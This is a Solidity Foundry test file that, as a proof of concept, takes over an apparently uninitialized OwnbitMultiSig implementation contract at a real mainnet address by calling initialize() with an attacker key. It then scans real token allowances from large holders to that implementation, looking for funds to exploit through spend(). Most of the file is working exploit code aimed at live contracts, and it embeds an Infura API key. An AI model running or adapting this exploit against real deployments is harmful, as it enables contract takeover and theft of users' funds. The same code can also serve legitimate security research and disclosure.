// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title ImplChainExploit
 * @notice Exploit uninitialized OwnbitMultiSig implementation for cross-contract attacks
 *
 * Attack flow:
 * 1. Initialize implementation with attacker as owner
 * 2. Use spend() to make arbitrary calls FROM implementation address
 * 3. Exploit any contract that trusts implementation address
 */

interface IOwnbitMultiSig {
    function initialize(address[] calldata _owners, uint256 _required) external;
    function getOwners() external view returns (address[] memory);
    function spend(address destination, uint256 value, uint8[] calldata vs, bytes32[] calldata rs, bytes32[] calldata ss, bytes calldata data) external;
    function spendNonce() external view returns (uint256);
    function isOwner(address) external view returns (bool);
}

contract ImplChainExploit is Test {
    address constant IMPL = 0x95Ca2f7959f8848795dFB0868C1b0c59Dd4E9330;
    address constant PROXY = 0x98b81a38cc8Ff51BD3862418188264e0b2A6f0C8;

    // Attacker's private key for signing (in test only)
    uint256 constant ATTACKER_PK = 0xBEEF;
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        attacker = vm.addr(ATTACKER_PK);
        vm.deal(attacker, 10 ether);
    }

    /**
     * STEP 1: Take over the implementation
     */
    function test_Step1_TakeoverImplementation() public {
        IOwnbitMultiSig impl = IOwnbitMultiSig(IMPL);

        console.log("=== STEP 1: IMPLEMENTATION TAKEOVER ===");
        console.log("Target:", IMPL);

        // Verify uninitialized
        address[] memory ownersBefore = impl.getOwners();
        console.log("Owners before:", ownersBefore.length);
        assertEq(ownersBefore.length, 0, "Should be uninitialized");

        // Initialize with attacker
        address[] memory newOwners = new address[](1);
        newOwners[0] = attacker;

        vm.prank(attacker);
        impl.initialize(newOwners, 1);

        // Verify takeover
        address[] memory ownersAfter = impl.getOwners();
        console.log("Owners after:", ownersAfter.length);
        console.log("New owner:", ownersAfter[0]);
        assertEq(ownersAfter[0], attacker, "Attacker should be owner");

        console.log("");
        console.log("TAKEOVER SUCCESSFUL!");
    }

    /**
     * STEP 2: Verify we control implementation after takeover
     */
    function test_Step2_VerifyControlAfterTakeover() public {
        IOwnbitMultiSig impl = IOwnbitMultiSig(IMPL);

        // First takeover
        address[] memory newOwners = new address[](1);
        newOwners[0] = attacker;
        vm.prank(attacker);
        impl.initialize(newOwners, 1);

        console.log("=== STEP 2: VERIFY IMPLEMENTATION CONTROL ===");
        console.log("");
        console.log("After takeover:");
        console.log("  isOwner(attacker):", impl.isOwner(attacker));
        console.log("  spendNonce:", impl.spendNonce());
        console.log("");
        console.log("We can now call spend() to make arbitrary calls FROM:", IMPL);
        console.log("Any contract that checks msg.sender == IMPL can be exploited");
    }

    /**
     * STEP 3: Find and exploit contracts trusting the implementation
     */
    function test_Step3_FindTrustingContracts() public {
        console.log("=== STEP 3: FINDING TRUSTING CONTRACTS ===");
        console.log("");
        console.log("After takeover, we can make calls FROM:", IMPL);
        console.log("");
        console.log("Potential exploitation targets:");
        console.log("1. Contracts with isApprovedOperator[impl] = true");
        console.log("2. Contracts with authorizedCallers[impl] = true");
        console.log("3. Token contracts where impl has approval to spend");
        console.log("4. Vaults where impl is a depositor/withdrawer");
        console.log("5. Bridges where impl is a relayer");
        console.log("");

        // Check common patterns
        // Example: Check if any major token has impl as approved spender

        address[] memory tokens = new address[](3);
        tokens[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
        tokens[1] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC
        tokens[2] = 0xdAC17F958D2ee523a2206206994597C13D831ec7; // USDT

        // Check if any rich addresses have approved impl
        address[] memory richAddresses = new address[](3);
        richAddresses[0] = 0x47ac0Fb4F2D84898e4D9E7b4DaB3C24507a6D503; // Binance
        richAddresses[1] = 0xBE0eB53F46cd790Cd13851d5EFf43D12404d33E8; // Binance 7
        richAddresses[2] = 0x8315177aB297bA92A06054cE80a67Ed4DBd7ed3a; // Arbitrum Bridge

        for (uint i = 0; i < tokens.length; i++) {
            for (uint j = 0; j < richAddresses.length; j++) {
                (bool success, bytes memory data) = tokens[i].staticcall(
                    abi.encodeWithSignature("allowance(address,address)", richAddresses[j], IMPL)
                );
                if (success && data.length >= 32) {
                    uint256 allowance = abi.decode(data, (uint256));
                    if (allowance > 0) {
                        console.log("FOUND ALLOWANCE!");
                        console.log("  Token:", tokens[i]);
                        console.log("  Owner:", richAddresses[j]);
                        console.log("  Spender (impl):", IMPL);
                        console.log("  Amount:", allowance);
                    }
                }
            }
        }
    }

    /**
     * STEP 4: Check proxy contracts using this implementation
     */
    function test_Step4_CheckProxyRelationships() public {
        console.log("=== STEP 4: PROXY ANALYSIS ===");
        console.log("");

        // The proxy at 0x98b81... uses this implementation
        // Check if proxy has any valuable assets

        console.log("Known proxy:", PROXY);
        console.log("Proxy ETH balance:", PROXY.balance);

        // Check proxy token balances
        address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

        (bool s1, bytes memory d1) = WETH.staticcall(
            abi.encodeWithSignature("balanceOf(address)", PROXY)
        );
        if (s1) console.log("Proxy WETH:", abi.decode(d1, (uint256)));

        (bool s2, bytes memory d2) = USDC.staticcall(
            abi.encodeWithSignature("balanceOf(address)", PROXY)
        );
        if (s2) console.log("Proxy USDC:", abi.decode(d2, (uint256)));

        console.log("");
        console.log("NOTE: Even if proxy has funds, we cannot drain them");
        console.log("because proxy uses DELEGATECALL which uses proxy's storage,");
        console.log("not the implementation's storage we took over.");
        console.log("");
        console.log("BUT: If ANY contract trusts the implementation address,");
        console.log("we can exploit that trust by calling from impl.");
    }
}

